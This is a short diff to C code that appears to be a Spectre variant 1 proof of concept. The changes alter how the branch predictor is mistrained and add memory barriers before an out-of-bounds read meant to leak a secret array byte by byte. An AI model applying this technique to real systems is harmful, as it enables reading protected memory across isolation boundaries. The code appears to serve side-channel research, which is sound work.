@@ -5,7 +5,7 @@
 #include "gen_array.c"
 #include "time_and_flush.c"
 
-#define REPETITIONS 5
+#define REPETITIONS 10
 
 //last two pages will not be accessible.
 //int accessible_pages = N_PAGES-2;
@@ -37,15 +37,22 @@ int* spv1(int index) {
     flush_arr((void*)arr);
 
     //Misstrain branch predictor
-    for(int i = 0; i < accessible - rand() % 10; i++) {
-        victim_func(i, arr, data);
+
+    int n_accesses = accessible + 1;
+    int accesses[n_accesses];
+    for(int i = 0; i < n_accesses; i++) accesses[i] = i;
+    accesses[n_accesses-1] = index;
+    for(int i = 0; i < n_accesses; i++) {
+        victim_func(accesses[i], arr, data);
         __sync_synchronize();
         flush((void*)&arr[data[i]]);
+
     }
+
 
     //flush remnant data
     //flush_arr((void*)arr);
-    //__sync_synchronize();
+    __sync_synchronize();
 
     //access out of bounds
     victim_func(index, arr, data);
@@ -88,6 +95,7 @@ int main(int argc, char* argv[]) {
 
         for (int s = 0; s < secret_size; s++) {
             results[s] = spv1(accessible + s);
+            __sync_synchronize();
         }
 
 
